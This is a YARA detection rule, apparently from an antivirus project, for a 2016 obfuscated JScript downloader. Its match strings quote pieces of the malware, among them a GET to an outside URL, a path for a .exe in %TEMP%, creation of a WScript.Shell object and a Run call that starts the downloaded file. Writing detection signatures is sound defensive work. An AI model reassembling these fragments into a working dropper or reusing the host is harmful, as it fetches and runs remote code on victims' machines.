rule sig_20160328_4171ae46542a6ab8aacc0c2dd7cd9e4a {
  meta:
    description = "datamaliciousorder - file 20160328_4171ae46542a6ab8aacc0c2dd7cd9e4a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1072a0044b74798626a12aed40898039a0fde4c3bafb3e8b8a936f92640f8231"

  strings:
    $s1  = "function Oagpyfval() {return Ywtafgli[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"QJTJZ6k6Zg.exe\";};" fullword ascii
    $s2  = "do {WScript[Yirwq](Xbieahnp() * 11)} while (Dxtawlbzsd[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Ywtafgli = function Whkculbrpi() {return WScript[Zamewyw](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Eoxqra(Hszzzvi, Zemuyyws){return Hszzzvi - Zemuyyws;};" fullword ascii
    $s5  = "Dxtawlbzsd[Yrurznqo](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s6  = "function Lipxjy() {return ((Dqpkwzic == true) && (Dqpkwzic == Cwhym)) ? 1 : Ezekd;};" fullword ascii
    $s7  = "function Orpawijoe(Mjpidqu){Ywtafgli[\"Run\"](Mjpidqu, Ezekd, Ezekd);};" fullword ascii
    $s8  = "Dqpkwzic = true; " fullword ascii
    $s9  = "function Yhddvjb(){return Zamewyw;};" fullword ascii
    $s10 = "function Xbieahnp(){return 22;};" fullword ascii
    $s11 = "function Ciksbvcxjy(Nzdlddcncv) {var Chxilkqexu = (1, 2, 3, 4, 5, Nzdlddcncv); return Chxilkqexu;};" fullword ascii
    $s12 = "function Wqcpwg()" fullword ascii
    $s13 = "var Yxiavw = false;" fullword ascii
    $s14 = "return Eoxqra(Slxwi, Wkkpehekm);" fullword ascii
    $s15 = " while (Khsrrwmwo){" fullword ascii
    $s16 = "function Xxezdskvae(){return Yiuiywefc;};" fullword ascii
    $s17 = "var Cwhym = false;" fullword ascii
    $s18 = "var Dqpkwzic = false;" fullword ascii
    $s19 = "var Axnbf = new this[\"Date\"]();" fullword ascii
    $s20 = "Cwhym = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}